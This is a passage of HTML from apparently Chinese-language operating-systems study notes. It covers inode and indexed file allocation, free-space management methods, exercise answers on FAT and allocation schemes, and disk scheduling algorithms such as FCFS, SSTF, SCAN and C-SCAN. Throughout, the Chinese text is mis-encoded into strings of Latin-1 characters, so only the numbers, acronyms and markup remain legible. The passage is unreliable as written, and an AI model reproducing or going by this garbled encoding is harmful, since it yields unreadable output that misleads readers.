ä¸ºäº†è®¿é—®ä¸€å—ï¼Œ æ“ä½œç³»ç»Ÿé€šè¿‡ç¬¬ä¸€å±‚ç´¢å¼•æŸ¥æ‰¾ç¬¬äºŒå±‚ç´¢å¼•ï¼Œ å†ç”¨ç¬¬äºŒå±‚ç´¢å¼•æŸ¥æ‰¾æ‰€éœ€çš„æ•°æ®å—ã€‚ è¿™ç§æ–¹æ³•æ ¹æ®æœ€å¤§æ–‡ä»¶å¤§å°çš„è¦æ±‚ï¼Œ å¯ä»¥ç»§ç»­åˆ°ç¬¬ä¸‰æˆ–ç¬¬å››å±‚ã€‚ å¯¹äºæœ‰ 4 096 B çš„å—ï¼Œ å¯ä»¥åœ¨ç´¢å¼•å—ä¸­å­˜å…¥ 1 024 ä¸ª4Bçš„æŒ‡é’ˆã€‚ ä¸¤å±‚ç´¢å¼•å…è®¸1048576ä¸ªæ•°æ®å—ï¼Œ è¿™å…è®¸æœ€å¤§æ–‡ä»¶ä¸º 4GBã€‚</li><li>ç»„åˆæ–¹æ¡ˆï¼šåœ¨ UFS ä¸­ä½¿ç”¨çš„å¦ ä¸€æ–¹æ¡ˆæ˜¯å°†ç´¢å¼•å—çš„å¤´ 15 ä¸ªæŒ‡é’ˆå­˜åœ¨æ–‡ä»¶çš„ inodeä¸­ã€‚ è¿™å…¶ä¸­çš„å¤´ 12 ä¸ªæŒ‡é’ˆæŒ‡å‘ç›´æ¥å—ï¼šå³å®ƒä»¬åŒ…æ‹¬äº†èƒ½å­˜å‚¨æ–‡ä»¶æ•°æ®çš„å—çš„åœ°å€ã€‚ å› æ­¤ï¼Œï¼ˆä¸è¶…è¿‡ 12 å—çš„ã€‰å°æ–‡ä»¶ä¸éœ€è¦å…¶ä»–çš„ç´¢å¼•å—ã€‚ å¦‚æœå—å¤§å°ä¸º 4 KB ï¼Œ é‚£ä¹ˆä¸è¶…è¿‡ 48 KBçš„æ•°æ®å¯ä»¥ç›´æ¥è®¿é—®ã€‚å…¶ä»–3ä¸ªæŒ‡é’ˆæŒ‡å‘é—´æ¥å—ã€‚ç¬¬ä¸€ä¸ªé—´æ¥å—æŒ‡é’ˆä¸ºä¸€çº§é—´æ¥å—çš„åœ°å€ã€‚ä¸€çº§é—´æ¥å—ä¸ºç´¢å¼•å—ï¼Œ å®ƒåŒ…å«çš„ä¸æ˜¯æ•°æ®ï¼Œ è€Œæ˜¯é‚£äº›åŒ…å«æ•°æ®çš„å—çš„åœ°å€ã€‚ æ¥ç€æ˜¯ä¸€ä¸ªäºŒçº§é—´æ¥å—æŒ‡é’ˆï¼Œ å®ƒåŒ…å«äº† ä¸€ä¸ªå—çš„åœ°å€ï¼Œ è€Œè¿™ä¸ªå—ä¸­çš„åœ°å€æŒ‡å‘äº†ä¸€äº›å—ï¼Œ è¿™äº›å—ä¸­åˆåŒ…å«äº†æŒ‡å‘çœŸå®æ•°æ®å—çš„æŒ‡é’ˆã€‚ æœ€åä¸€ä¸ªæŒ‡é’ˆä¸ºä¸‰çº§é—´æ¥å—æŒ‡é’ˆã€‚ é‡‡ç”¨è¿™ç§æ–¹æ³•ï¼Œä¸€ä¸ªæ–‡ä»¶çš„å—æ•°å¯ä»¥è¶…è¿‡è®¸å¤šæ“ä½œç³»ç»Ÿæ‰€ä½¿ç”¨çš„ 4B çš„æ–‡ä»¶æŒ‡é’ˆæ‰€èƒ½è®¿é—®çš„ç©ºé—´ã€‚ 32 ä½æŒ‡é’ˆåªèƒ½è®¿é—® 2<sup>32</sup> Bï¼Œ å³4GBã€‚ è®¸å¤š UNIX å¦‚ Solaris å’Œ IBM AIX ç°åœ¨æ”¯æŒé«˜è¾¾ 64 ä½çš„æ–‡ä»¶æŒ‡é’ˆã€‚ è¿™æ ·çš„æŒ‡é’ˆå…è®¸æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿä¸ºæ•°å¤ªå­—èŠ‚ã€‚ å›¾ 11.9 æ˜¾ç¤ºäº†ä¸€ä¸ª UNIX çš„inodeã€‚</li></ul><p><img src="/posts/8ce3e425/image-20220108152148247.png" alt="image-20220108152148247"></p><h3 id="1144-æ€§èƒ½"><a class="markdownIt-Anchor" href="#1144-æ€§èƒ½"></a> 11.4.4 æ€§èƒ½</h3><h2 id="115-ç©ºé—²ç©ºé—´ç®¡ç†"><a class="markdownIt-Anchor" href="#115-ç©ºé—²ç©ºé—´ç®¡ç†"></a> 11.5 ç©ºé—²ç©ºé—´ç®¡ç†</h2><p>ä¸ºäº†è®°å½•ç©ºé—²ç£ç›˜ç©ºé—´ï¼Œç³»ç»Ÿéœ€è¦ç»´æŠ¤ä¸€ä¸ªç©ºé—²ç©ºé—´é“¾è¡¨ã€‚ ç©ºé—²ç©ºé—´é“¾è¡¨è®°å½•äº†æ‰€æœ‰ç©ºé—²ç£ç›˜ç©ºé—´ï¼Œ å³æœªåˆ†é…ç»™æ–‡ä»¶æˆ–ç›®å½•çš„ç©ºé—´ã€‚ å½“åˆ›å»ºæ–‡ä»¶æ—¶ï¼Œ æœç´¢ç©ºé—²ç©ºé—´é“¾è¡¨ä»¥å¾—åˆ°æ‰€éœ€è¦çš„ç©ºé—´ï¼Œ å¹¶åˆ†é…ç»™æ–°æ–‡ä»¶ã€‚ è¿™äº›ç©ºé—´ä¼šä»ç©ºé—²ç©ºé—´é“¾è¡¨ä¸­åˆ é™¤ã€‚ å½“åˆ é™¤æ–‡ä»¶æ—¶ï¼Œ å…¶ç£ç›˜ç©ºé—´ä¼šå¢åŠ åˆ°ç©ºé—²ç©ºé—´è¡¨ä¸Šã€‚ ç©ºé—²ç©ºé—´é“¾è¡¨è™½ç„¶ç§°ä¸ºé“¾è¡¨ï¼Œ ä½†ä¸ä¸€å®šè¡¨ç°ä¸ºé“¾è¡¨ã€‚</p><h3 id="1151-ä½å‘é‡"><a class="markdownIt-Anchor" href="#1151-ä½å‘é‡"></a> 11.5.1 ä½å‘é‡</h3><p>ç©ºé—²ç©ºé—´è¡¨å®ç°ä¸ºä½å›¾ï¼ˆbit mapï¼‰ æˆ–ä½å‘é‡ï¼ˆbit vectorï¼‰ã€‚ æ¯å—ç”¨ä¸€ä½è¡¨ç¤ºã€‚ å¦‚æœä¸€å—ä¸ºç©ºé—²ï¼Œ é‚£ä¹ˆå…¶ä½ä¸º1ï¼šå¦‚æœä¸€å—å·±åˆ†é…ï¼Œ é‚£ä¹ˆå…¶ä½ä¸º0ã€‚</p><p>ä¾‹å¦‚ï¼Œ å‡è®¾æœ‰ä¸€ä¸ªç£ç›˜ï¼Œå…¶å— 2 ã€ 3ã€ 4ã€ 5ã€ 8ã€9ã€ 10ã€ 11ã€ 12ã€ 13ã€ 17ã€ 18 ã€ 25ã€ 26ã€<br>27 ä¸ºç©ºé—²ï¼Œ å…¶ä»–å—ä¸ºå·±åˆ†é…ã€‚ é‚£ä¹ˆï¼Œ ç©ºé—²ç©ºé—´ä½å›¾å¦‚ä¸‹ï¼š<br>001111001111110001100000011100000Â·Â·Â·</p><h3 id="1152-é“¾è¡¨"><a class="markdownIt-Anchor" href="#1152-é“¾è¡¨"></a> 11.5.2 é“¾è¡¨</h3><p>ç©ºé—²ç©ºé—´ç®¡ç†çš„å¦ä¸€ç§æ–¹æ³•æ˜¯å°†æ‰€æœ‰ç©ºé—²ç£ç›˜å—ç”¨é“¾è¡¨è¿æ¥èµ·æ¥ï¼Œ å¹¶å°†æŒ‡å‘ç¬¬ä¸€ç©ºé—²å—çš„æŒ‡é’ˆä¿å­˜åœ¨ç£ç›˜çš„ç‰¹æ®Šä½ç½®ï¼Œ åŒæ—¶ä¹Ÿç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚ ç¬¬ä¸€å—åŒ…å«ä¸€ä¸ªä¸‹ä¸€ç©ºé—²ç£ç›˜å—çš„æŒ‡é’ˆï¼Œ å¦‚æ­¤ç»§ç»­ä¸‹å»ã€‚</p><p><img src="/posts/8ce3e425/image-20220108152927671.png" alt="image-20220108152927671"></p><h3 id="1153-ç»„"><a class="markdownIt-Anchor" href="#1153-ç»„"></a> 11.5.3 ç»„</h3><p>å¯¹ç©ºé—²é“¾è¡¨çš„ä¸€ä¸ªæ”¹è¿›æ˜¯å°†nä¸ªç©ºé—²å—çš„åœ°å€å­˜åœ¨ç¬¬ä¸€ä¸ªç©ºé—²å—ä¸­ã€‚è¿™äº›å—ä¸­çš„å‰ n-1ä¸ªç¡®å®ä¸ºç©ºï¼Œ è€Œæœ€åä¸€å—åŒ…å«å¦å¤–nä¸ªç©ºé—²å—çš„åœ°å€ï¼Œ å¦‚æ­¤ç»§ç»­ã€‚ å¤§é‡ç©ºé—²å—çš„åœ°å€å¯ä»¥å¾ˆå¿«åœ°æ‰¾åˆ°ï¼Œ è¿™ä¸€ç‚¹æœ‰åˆ«äºæ ‡å‡†é“¾è¡¨æ–¹æ³•ã€‚</p><h3 id="1154-è®¡æ•°"><a class="markdownIt-Anchor" href="#1154-è®¡æ•°"></a> 11.5.4 è®¡æ•°</h3><p>å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨è¿™æ ·ä¸€ä¸ªäº‹å®ï¼š é€šå¸¸ï¼Œ æœ‰å¤šä¸ªè¿ç»­å—éœ€è¦åŒæ—¶åˆ†é…æˆ–é‡Šæ”¾ï¼Œ å°¤å…¶æ˜¯åœ¨ä½¿ç”¨è¿ç»­åˆ†é…å’Œé‡‡ç”¨ç°‡æ—¶æ›´æ˜¯å¦‚æ­¤ã€‚ å› æ­¤ï¼Œ ä¸æ˜¯è®°å½•nä¸ªç©ºé—²å—çš„åœ°å€ï¼Œ è€Œæ˜¯å¯ä»¥è®°å½•ç¬¬ä¸€å—çš„åœ°å€å’Œç´§è·Ÿç¬¬ä¸€å—çš„è¿ç»­çš„ç©ºé—²å—çš„æ•°é‡ nã€‚ è¿™æ ·ï¼Œ ç©ºé—²ç©ºé—´è¡¨çš„æ¯ä¸ªæ¡ç›®åŒ…æ‹¬ç£ç›˜åœ°å€å’Œæ•°é‡ã€‚ è™½ç„¶æ¯ä¸ªæ¡ç›®ä¼šæ¯”åŸæ¥éœ€è¦æ›´å¤šç©ºé—´ï¼Œ ä½†æ˜¯è¡¨çš„æ€»é•¿åº¦ä¼šæ›´çŸ­ï¼Œ è¿™æ˜¯å› ä¸ºè¿ç»­å—çš„æ•°é‡å¸¸å¸¸å¤§äº1ã€‚</p><h2 id="116-æ•ˆç‡ä¸æ€§èƒ½"><a class="markdownIt-Anchor" href="#116-æ•ˆç‡ä¸æ€§èƒ½"></a> 11.6 æ•ˆç‡ä¸æ€§èƒ½</h2><h3 id="1161-æ•ˆç‡"><a class="markdownIt-Anchor" href="#1161-æ•ˆç‡"></a> 11.6.1 æ•ˆç‡</h3><p>ç£ç›˜ç©ºé—´çš„æœ‰æ•ˆä½¿ç”¨ä¸»è¦å–å†³äºæ‰€ä½¿ç”¨çš„ç£ç›˜åˆ†é…å’Œç›®å½•ç®¡ç†ç®—æ³•ã€‚</p><h3 id="1162-æ€§èƒ½"><a class="markdownIt-Anchor" href="#1162-æ€§èƒ½"></a> 11.6.2 æ€§èƒ½</h3><h2 id="ä¹ é¢˜-2"><a class="markdownIt-Anchor" href="#ä¹ é¢˜-2"></a> ä¹ é¢˜</h2><h2 id="112"><a class="markdownIt-Anchor" href="#112"></a> 11.2</h2><blockquote><p>é“¾æ¥åˆ†é…çš„ä¸€ç§å˜ç§ä¸­ï¼Œ ä½¿ç”¨ FAT æŠŠæ–‡ä»¶çš„æ‰€æœ‰å—é“¾æ¥èµ·æ¥ï¼Œ å®ƒçš„ä¼˜ç‚¹å’Œç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</p></blockquote><p>ä¼˜ç‚¹ï¼šæ”¹å–„äº†éšæœºè®¿é—®æ—¶é—´ï¼Œå› ä¸ºé€šè¿‡è¯»å…¥ FAT ä¿¡æ¯ï¼Œç£å¤´èƒ½æ‰¾åˆ°ä»»ä½•å—çš„ä½ç½®ã€‚åœ¨è®¿é—®å­˜å‚¨åœ¨æ–‡ä»¶ä¸­é—´çš„å—æ—¶ï¼Œå¯ä»¥é€šè¿‡è¿½è¸ªå­˜å‚¨åœ¨FATAä¸­çš„æŒ‡é’ˆæ¥ç¡®å®šå…¶ä½ç½®ï¼Œè€Œä¸æ˜¯ä»¥é¡ºåºæ–¹å¼è®¿é—®æ–‡ä»¶çš„æ‰€æœ‰å•ä¸ªå—ä»¥æ‰¾åˆ°æŒ‡å‘ç›®æ ‡å—çš„æŒ‡é’ˆã€‚é€šå¸¸ï¼Œå¤§éƒ¨åˆ†FATéƒ½å¯ä»¥ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œå› æ­¤æŒ‡é’ˆå¯ä»¥é€šè¿‡å†…å­˜è®¿é—®æ¥ç¡®å®šï¼Œè€Œä¸å¿…è®¿é—®ç£ç›˜å—ã€‚</p><p>ç¼ºç‚¹ï¼šå¦‚æœä¸å¯¹ FAT é‡‡ç”¨ç¼“å­˜ï¼ŒFAT åˆ†é…æ–¹æ¡ˆå¯èƒ½å¯¼è‡´å¤§é‡çš„ç£å¤´å¯»é“æ—¶é—´ã€‚ç£å¤´å¿…é¡»ç§»åˆ°å·çš„å¼€å¤´ä»¥ä¾¿è¯»å…¥ FATï¼Œå¯»æ‰¾æ‰€éœ€è¦å—çš„ä½ç½®ï¼Œæ¥ç€ç§»åˆ°å—æœ¬èº«çš„ä½ç½®ã€‚åœ¨æœ€åçš„æƒ…å†µä¸‹ï¼Œæ¯å—éƒ½éœ€è¦ä¸¤æ¬¡ç§»åŠ¨ã€‚</p><h2 id="114"><a class="markdownIt-Anchor" href="#114"></a> 11.4</h2><blockquote><p>æœ‰ä¸€äº›æ–‡ä»¶ç³»ç»Ÿå…è®¸ç£ç›˜ç©ºé—´åœ¨ä¸åŒçš„ç²’åº¦çº§åˆ«åˆ†é…ã€‚ æ¯”å¦‚ï¼Œ æ–‡ä»¶ç³»ç»Ÿå¯ä»¥æŠŠ 4KBçš„ç£ç›˜ç©ºé—´åˆ†é…ä¸ºä¸€ä¸ª 4KB çš„å—ï¼Œ æˆ–è€… 8 ä¸ª 512 B çš„å—ã€‚ å¯ä»¥æ€æ ·åˆ©ç”¨è¿™ç§ç‰¹æ€§æ¥æ”¹è¿›æ€§èƒ½ï¼Ÿè¦æ”¯æŒè¿™ç§ç‰¹æ€§éœ€è¦å¯¹ç©ºé—²ç©ºé—´ç®¡ç†æœºåˆ¶åšä»€ä¹ˆä¿®æ”¹ï¼Ÿ</p></blockquote><p>è¿™æ ·çš„æ–¹æ¡ˆå°†å‡å°‘å†…éƒ¨ç¢ç‰‡ã€‚å¦‚æœä¸€ä¸ªæ–‡ä»¶æ˜¯5KBï¼Œé‚£ä¹ˆå®ƒå¯èƒ½ä½äºä¸€ä¸ª4KBå—å’Œä¸¤ä¸ªè¿ç»­çš„512å­—èŠ‚å—ã€‚é™¤äº†ç»´æŠ¤ç©ºé—²å—çš„ä½å›¾å¤–ï¼Œè¿˜å¿…é¡»ç»´æŠ¤å…³äºå—å†…å½“å‰æ­£åœ¨ä½¿ç”¨çš„å­å—çš„é¢å¤–çŠ¶æ€ã€‚å®šä½å™¨éšåå¿…é¡»æ£€æŸ¥è¯¥é¢å¤–çŠ¶æ€ä»¥åˆ†é…å­å—ï¼Œå¹¶åœ¨æ‰€æœ‰å­å—ç©ºé—²æ—¶åˆå¹¶å­å—ä»¥è·å¾—è¾ƒå¤§çš„å—</p><h2 id="116"><a class="markdownIt-Anchor" href="#116"></a> 11.6</h2><blockquote><p>è®¾æƒ³ä¸€ä¸ªåœ¨ç£ç›˜ä¸Šçš„ç³»ç»Ÿçš„é€»è¾‘å—å’Œç‰©ç†å—çš„å¤§å°éƒ½ä¸º 512 Bã€‚å‡è®¾æ¯ä¸ªæ–‡ä»¶çš„ä¿¡æ¯å·²ç»åœ¨å†…å­˜ä¸­ã€‚ é’ˆå¯¹ä¸‰ç§åˆ†é…æ–¹æ³•ï¼ˆè¿ç»­åˆ†é…ã€ é“¾æ¥åˆ†é…å’Œç´¢å¼•åˆ†é…ï¼‰ï¼Œ åˆ†åˆ«å›ç­”ä¸‹é¢çš„é—®é¢˜ã€‚<br>a. é€»è¾‘åœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„æ˜¯æ€æ ·è¿›è¡Œçš„ï¼ˆå¯¹ç´¢å¼•åˆ†é…ï¼Œ å‡è®¾æ–‡ä»¶æ€»æ˜¯å°äº 512 å—)ï¼Ÿ</p><p>b. å‡è®¾å½“å‰å¤„åœ¨é€»è¾‘å— 10 (æœ€åè®¿é—®çš„å—æ˜¯å— 10ï¼‰ï¼Œ ç°åœ¨æƒ³è®¿é—®é€»è¾‘å— 4ï¼Œ é‚£ä¹ˆå¿…é¡»ä»ç£ç›˜ä¸Šè¯»å¤šå°‘ä¸ªç‰©ç†å—ï¼Ÿ</p></blockquote><p>è®¾Zä¸ºèµ·å§‹æ–‡ä»¶åœ°å€ï¼ˆå—å·ï¼‰</p><p><strong>è¿ç»­åˆ†é…ï¼š</strong></p><p>a. å°†é€»è¾‘åœ°å€é™¤ä»¥512ï¼ŒXå’ŒYä¸ºæ‰€å¾—å•†å’Œä½™æ•°ã€‚å°†Xæ·»åŠ åˆ°Zä»¥è·å¾—ç‰©ç†å—ç¼–å·ã€‚Yæ˜¯åˆ°é‚£ä¸ªå—çš„ä½ç§»</p><p>b. 1ä¸ªç‰©ç†å—</p><p><strong>é“¾æ¥åˆ†é…ï¼š</strong></p><p>a. å°†é€»è¾‘ç‰©ç†åœ°å€é™¤ä»¥511ï¼ŒXå’ŒYä¸ºæ‰€å¾—çš„å•†å’Œä½™æ•°ï¼Œå‘ä¸‹æœç´¢é“¾æ¥åˆ—è¡¨ï¼ˆè·å¾—X+1ä¸ªå—ï¼‰ã€‚Y+1æ˜¯åˆ°æœ€åä¸€ä¸ªç‰©ç†å—çš„ä½ç§»ã€‚</p><p>b. 4ä¸ªç‰©ç†å—</p><p><strong>ç´¢å¼•åˆ†é…ï¼š</strong></p><p>a. å°†é€»è¾‘åœ°å€é™¤ä»¥512ï¼ŒXå’ŒYä¸ºæ‰€å¾—å•†å’Œä½™æ•°ã€‚å°†ç´¢å¼•å—å­˜å‚¨åˆ°å†…å­˜ä¸­ã€‚ç‰©ç†å—åœ°å€åŒ…å«åœ¨ä½ç½®X.Yå¤„çš„ç´¢å¼•å—æ˜¯æ‰€éœ€ç‰©ç†å—çš„ä½ç§»</p><p>b. 2ä¸ªç‰©ç†å—</p><h1 id="ç¬¬12ç« -å¤§å®¹é‡å­˜å‚¨å™¨çš„ç»“æ„"><a class="markdownIt-Anchor" href="#ç¬¬12ç« -å¤§å®¹é‡å­˜å‚¨å™¨çš„ç»“æ„"></a> ç¬¬12ç«  å¤§å®¹é‡å­˜å‚¨å™¨çš„ç»“æ„</h1><h2 id="121-å¤§å®¹é‡å­˜å‚¨å™¨ç»“æ„ç®€ä»‹"><a class="markdownIt-Anchor" href="#121-å¤§å®¹é‡å­˜å‚¨å™¨ç»“æ„ç®€ä»‹"></a> 12.1 å¤§å®¹é‡å­˜å‚¨å™¨ç»“æ„ç®€ä»‹</h2><h3 id="1211-ç£ç›˜"><a class="markdownIt-Anchor" href="#1211-ç£ç›˜"></a> 12.1.1 ç£ç›˜</h3><p><img src="/posts/8ce3e425/image-20220108155656247.png" alt="image-20220108155656247"></p><p><strong>ç£ç›˜è®¿é—®æ—¶é—´=</strong> <strong>å¯»é“æ—¶é—´</strong> <strong>+</strong> <strong>æ—‹è½¬æ—¶é—´</strong> <strong>+</strong> <strong>ä¼ è¾“æ—¶é—´</strong> <strong>+</strong> <strong>æ§åˆ¶å™¨å¼€é”€</strong></p><h3 id="1212-ç£å¸¦"><a class="markdownIt-Anchor" href="#1212-ç£å¸¦"></a> 12.1.2 ç£å¸¦</h3><h2 id="122-ç£ç›˜ç»“æ„"><a class="markdownIt-Anchor" href="#122-ç£ç›˜ç»“æ„"></a> 12.2 ç£ç›˜ç»“æ„</h2><h2 id="123-ç£ç›˜é™„å±"><a class="markdownIt-Anchor" href="#123-ç£ç›˜é™„å±"></a> 12.3 ç£ç›˜é™„å±</h2><h3 id="1231-ä¸»æœºé™„å±å­˜å‚¨"><a class="markdownIt-Anchor" href="#1231-ä¸»æœºé™„å±å­˜å‚¨"></a> 12.3.1 ä¸»æœºé™„å±å­˜å‚¨</h3><h3 id="1232-ç½‘ç»œé™„å±å­˜å‚¨"><a class="markdownIt-Anchor" href="#1232-ç½‘ç»œé™„å±å­˜å‚¨"></a> 12.3.2 ç½‘ç»œé™„å±å­˜å‚¨</h3><h3 id="1233-å­˜å‚¨åŒºåŸŸç½‘ç»œ"><a class="markdownIt-Anchor" href="#1233-å­˜å‚¨åŒºåŸŸç½‘ç»œ"></a> 12.3.3 å­˜å‚¨åŒºåŸŸç½‘ç»œ</h3><h2 id="124-ç£ç›˜è°ƒåº¦"><a class="markdownIt-Anchor" href="#124-ç£ç›˜è°ƒåº¦"></a> 12.4 ç£ç›˜è°ƒåº¦</h2><p>æ“ä½œç³»ç»Ÿçš„ä»»åŠ¡ä¹‹ä¸€å°±æ˜¯æœ‰æ•ˆåœ°ä½¿ç”¨ç¡¬ä»¶ã€‚ å¯¹ç£ç›˜é©±åŠ¨å™¨æ¥è¯´ï¼Œ æ»¡è¶³è¿™ä¸€è¦æ±‚æ„å‘³ç€<br>è¦æœ‰è¾ƒå¿«çš„<strong>è®¿é—®é€Ÿåº¦</strong>å’Œè¾ƒå®½çš„<strong>ç£ç›˜å¸¦å®½</strong>ã€‚</p><ul><li><strong>è®¿é—®æ—¶é—´</strong>åŒ…æ‹¬ä¸¤ä¸ªä¸»è¦éƒ¨åˆ†ï¼ˆå‚è§12.1.1å°èŠ‚ã€‰ï¼šå¯»é“æ—¶é—´å’Œæ—‹è½¬å»¶è¿Ÿã€‚<ul><li><strong>å¯»é“æ—¶é—´</strong>æ˜¯ç£è‡‚å°†ç£å¤´ç§»åŠ¨åˆ°åŒ…å«ç›®æ ‡æ‰‡åŒºçš„æŸ±é¢çš„æ—¶é—´ã€‚</li><li><strong>æ—‹è½¬å»¶è¿Ÿ</strong>æ˜¯ç£ç›˜éœ€è¦å°†ç›®æ ‡æ‰‡åŒºè½¬åŠ¨åˆ°ç£å¤´ä¸‹çš„æ—¶é—´ã€‚</li></ul></li><li><strong>ç£ç›˜å¸¦å®½</strong>æ˜¯æ‰€ä¼ é€’çš„æ€»çš„å­—èŠ‚æ•°é™¤ä»¥ä»æœåŠ¡è¯·æ±‚å¼€å§‹åˆ°æœ€åä¼ é€’ç»“æŸæ—¶çš„æ€»æ—¶é—´ã€‚ å¯ä»¥é€šè¿‡ä½¿ç”¨é€‚å½“çš„è®¿é—®é¡ºåºæ¥è°ƒåº¦ç£ç›˜I/Oè¯·æ±‚ï¼Œ æé«˜è®¿é—®é€Ÿåº¦å’Œå¸¦å®½ã€‚</li></ul><h3 id="1241-fcfsè°ƒåº¦"><a class="markdownIt-Anchor" href="#1241-fcfsè°ƒåº¦"></a> 12.4.1 FCFSè°ƒåº¦</h3><p>æœ€ç®€å•çš„ç£ç›˜è°ƒåº¦å½¢å¼å½“ç„¶æ˜¯<strong>å…ˆæ¥å…ˆæœåŠ¡ç®—æ³•</strong> ï¼ˆ<strong>FCFS</strong> ï¼‰ã€‚</p><p>å¦‚æœç£å¤´å¼€å§‹ä½äº 53ï¼Œ é‚£ä¹ˆå®ƒå°†ä» 53 ç§»åˆ°98ï¼Œ æ¥ç€å†åˆ° 183ã€ 37ã€ 122ã€ 14ã€ 124ã€ 65, æœ€ååˆ° 67ï¼Œ æ€»çš„ç£å¤´ç§»åŠ¨ä¸º640æŸ±é¢</p><p><img src="/posts/8ce3e425/image-20220108160611838.png" alt="image-20220108160611838"></p><ul><li>**ä¼˜ç‚¹ï¼š**ç®€å•ï¼Œå…¬å¹³ï¼›</li><li>**ç¼ºç‚¹ï¼š**æ•ˆç‡ä¸é«˜ï¼Œç›¸é‚»ä¸¤æ¬¡è¯·æ±‚å¯èƒ½ä¼šé€ æˆæœ€å†…åˆ°æœ€å¤–çš„æŸ±é¢å¯»é“ï¼Œä½¿ç£å¤´åå¤ç§»åŠ¨ï¼Œå¢åŠ äº†æœåŠ¡æ—¶é—´ï¼Œå¯¹æœºæ¢°ä¹Ÿä¸åˆ©</li></ul><h3 id="1242-sstfè°ƒåº¦"><a class="markdownIt-Anchor" href="#1242-sstfè°ƒåº¦"></a> 12.4.2 SSTFè°ƒåº¦</h3><p><strong>æœ€çŸ­å¯»é“æ—¶é—´ä¼˜å…ˆç®—æ³•</strong>ï¼ˆ shortest-seek-time-first <strong>SSTF</strong> ï¼‰ï¼šå…ˆå¤„ç†é è¿‘å½“å‰ç£å¤´ä½ç½®çš„è¯·æ±‚å¯èƒ½è¾ƒä¸ºåˆç†ã€‚</p><p>å¯¹äºå‰é¢è¯·æ±‚é˜Ÿåˆ—çš„ä¾‹å­ï¼Œ ä¸å¼€å§‹ç£å¤´ä½ç½®ï¼ˆ53ï¼‰ æœ€è¿‘çš„è¯·æ±‚æ˜¯ä½äºæŸ±é¢ 65ã€‚ å½“ä½äºæŸ±é¢ 65ï¼Œ ä¸‹ä¸ªæœ€è¿‘è¯·æ±‚ä½äºæŸ±é¢ 67ã€‚ ä»æŸ±é¢ 67ï¼Œ ç”±äºæŸ±é¢ 37 æ¯” 98 è¿˜è¦è¿‘ï¼Œ æ‰€ä»¥ä¸‹æ¬¡å¤„ç† 37ã€‚ å¦‚æ­¤ç»§ç»­è¿›è¡Œï¼Œ ä¼šå¤„ç†ä½äºæŸ±é¢ 14ï¼Œ æ¥ç€ 98 ã€ 122ã€ 124ï¼Œ æœ€åå¤„ç† 183 ä¸Šçš„è¯·æ±‚ï¼ˆå‚è§å›¾ 12.5ï¼‰ã€‚ è¿™ç§è°ƒåº¦ç®—æ³•æ‰€äº§ç”Ÿçš„ç£å¤´ç§»åŠ¨ä¸º 236 æŸ±é¢ï¼Œ çº¦ä¸º FCFS è°ƒåº¦ç®—æ³•æ‰€äº§ç”Ÿçš„ç£å¤´ç§»åŠ¨æ•°é‡çš„ä¸‰åˆ†ä¹‹ä¸€ ã€‚</p><p><img src="/posts/8ce3e425/image-20220108160943048.png" alt="image-20220108160943048"></p><ul><li>**ä¼˜ç‚¹ï¼š**æ”¹å–„äº†ç£ç›˜å¹³å‡æœåŠ¡æ—¶é—´ï¼›</li><li>**ç¼ºç‚¹ï¼š**é€ æˆæŸäº›è®¿é—®è¯·æ±‚é•¿æœŸç­‰å¾…å¾—ä¸åˆ°æœåŠ¡</li></ul><h3 id="1243-scanè°ƒåº¦"><a class="markdownIt-Anchor" href="#1243-scanè°ƒåº¦"></a> 12.4.3 SCANè°ƒåº¦</h3><p><strong>SCAN ç®—æ³•</strong>ï¼Œ ç£è‡‚ä»ç£ç›˜çš„ä¸€ç«¯å‘å¦ä¸€ç«¯ç§»åŠ¨ï¼ŒåŒæ—¶å½“ç£å¤´ç§»è¿‡æ¯ä¸ªæŸ±é¢æ—¶ï¼Œ å¤„ç†ä½äºè¯¥æŸ±é¢ä¸Šçš„æœåŠ¡è¯·æ±‚ã€‚ å½“åˆ°è¾¾å¦ ä¸€ç«¯æ—¶ï¼Œ ç£å¤´æ”¹å˜ç§»åŠ¨æ–¹å‘ï¼Œ å¤„ç†ç»§ç»­ã€‚SCANç®—æ³•æœ‰æ—¶è¢«ç§°ä¸º<strong>ç”µæ¢¯ç®—æ³•</strong>ï¼ˆelevator algorithmï¼‰ï¼Œ å› ä¸ºç£å¤´çš„è¡Œä¸ºå°±åƒå¤§æ¥¼é‡Œé¢çš„ç”µæ¢¯ï¼Œå…ˆå¤„ç†æ‰€æœ‰å‘ä¸Šè¯·æ±‚ï¼Œ ç„¶åå†å¤„ç†ç›¸åæ–¹å‘è¯·æ±‚ã€‚</p><p><img src="/posts/8ce3e425/image-20220108161631672.png" alt="image-20220108161631672"></p><ul><li>**ä¼˜ç‚¹ï¼š**å…‹æœäº†æœ€çŸ­å¯»é“ä¼˜å…ˆçš„ç¼ºç‚¹ï¼Œæ—¢è€ƒè™‘äº†è·ç¦»ï¼ŒåŒæ—¶åˆè€ƒè™‘äº†æ–¹å‘</li></ul><h3 id="1244-c-scanè°ƒåº¦"><a class="markdownIt-Anchor" href="#1244-c-scanè°ƒåº¦"></a> 12.4.4 C-SCANè°ƒåº¦</h3><p><strong>C-SCAN</strong> ï¼ˆcircular SCAN, C-SCANï¼‰è°ƒåº¦æ˜¯SCANè°ƒåº¦çš„å˜ç§ï¼Œ ä¸»è¦æä¾›ä¸€ä¸ªæ›´ä¸ºå‡åŒ€çš„ç­‰å¾…æ—¶é—´ã€‚ä¸SCAN ä¸€æ ·ï¼ŒC-SCANå°†ç£å¤´ä»ç£ç›˜ä¸€ç«¯ç§»åˆ°ç£ç›˜çš„å¦ä¸€ç«¯ï¼Œ éšç€ç§»åŠ¨ä¸æ–­åœ°å¤„ç†è¯·æ±‚ã€‚ä¸è¿‡ï¼Œå½“ç£å¤´ç§»åˆ°å¦ ä¸€ç«¯æ—¶ï¼Œ å®ƒä¼šé©¬ä¸Šè¿”å›åˆ°ç£ç›˜å¼€å§‹ï¼Œè¿”å›æ—¶å¹¶ä¸å¤„ç†è¯·æ±‚ï¼ˆå‚è§å›¾12.7ï¼‰ã€‚C-SCANè°ƒåº¦ç®—æ³•åŸºæœ¬ä¸Šå°†æŸ±é¢å½“åšä¸€ä¸ªç¯é“¾ï¼Œä»¥å°†æœ€åçš„æŸ±é¢å’Œç¬¬ä¸€ä¸ªæŸ±é¢ç›¸è¿ã€‚</p><p><img 